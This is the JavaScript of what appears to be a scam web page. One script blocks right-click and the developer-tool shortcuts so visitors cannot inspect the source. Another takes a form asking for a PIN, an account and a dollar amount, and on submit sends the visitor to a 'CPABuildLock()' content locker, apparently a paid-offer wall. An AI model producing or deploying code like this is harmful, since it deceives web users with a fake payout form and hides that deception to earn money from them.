        <script>
            document.addEventListener('contextmenu', (e) => e.preventDefault());

            function ctrlShiftKey(e, keyCode) {
                return e.ctrlKey && e.shiftKey && e.keyCode === keyCode.charCodeAt(0);
            }

            document.onkeydown = (e) => {
                if (
                    event.keyCode === 123 ||
                    ctrlShiftKey(e, 'I') ||
                    ctrlShiftKey(e, 'J') ||
                    ctrlShiftKey(e, 'C') ||
                    (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0))
                )
                    return false;
            };
        </script>

        <script type="text/javascript">
            document.getElementById("signup").addEventListener("submit", function (event) {
                event.preventDefault();
                var pin = document.getElementById("fristName").value;
                var account = document.getElementById("lastName").value;
                var amount = document.getElementById("email").value;

                // Redirect to the specified JavaScript function
                window.location.href = "javascript:CPABuildLock();";
            });

            document.getElementById("pin").addEventListener("input", function () {
                var formattedPin = this.value.replace(/\D/g, "").slice(0, 14);
                var dashSeparated = formattedPin.replace(/(\d{2})(?=\d{2})/g, "$1-");
                this.value = dashSeparated;
            });

            document.getElementById("amount").addEventListener("input", function () {
                var amountValue = this.value.replace(/[^0-9.]/g, "");
                if (amountValue) {
                    this.value = "$ " + amountValue;
                } else {
                    this.value = "";
                }
            });

            // Hide placeholder on input focus
            var inputs = document.getElementsByTagName("input");
            for (var i = 0; i < inputs.length; i++) {
                inputs[i].addEventListener("focus", function () {
                    this.removeAttribute("placeholder");
                });
            }
        </script>
